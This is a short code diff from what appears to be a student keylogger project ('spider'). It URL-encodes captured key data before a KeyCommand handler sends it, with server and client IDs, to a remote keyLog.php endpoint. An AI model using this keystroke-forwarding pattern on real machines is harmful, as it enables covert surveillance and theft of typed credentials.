@@ -5,7 +5,7 @@
 // Login   <mediav_j@epitech.net>
 //
 // Started on  Mon Oct 26 15:23:34 2015 Jérémy Mediavilla
-// Last update Wed Oct 28 11:31:50 2015 Joris Bertomeu
+// Last update Sun Nov  8 00:03:09 2015 Joris Bertomeu
 //
 
 #include <KeyCommand.hh>
@@ -25,7 +25,7 @@ bool		KeyCommand::execCommand(const std::string &srvId, const std::string &clien
 {
   (void)command;
 
-  HttpPost::request("toto", std::string("http://jobertomeu.fr/spider/servlets/keyLog.php?server=" + srvId + "&client=" + clientId + "&data=" + command));
+  HttpPost::request("toto", std::string("http://jobertomeu.fr/spider/servlets/keyLog.php?server=" + srvId + "&client=" + clientId + "&data=" + std::string(HttpPost::url_encode((char*)command.c_str()))));
   std::cout << "Key Command" << std::endl;
 
   return (true);
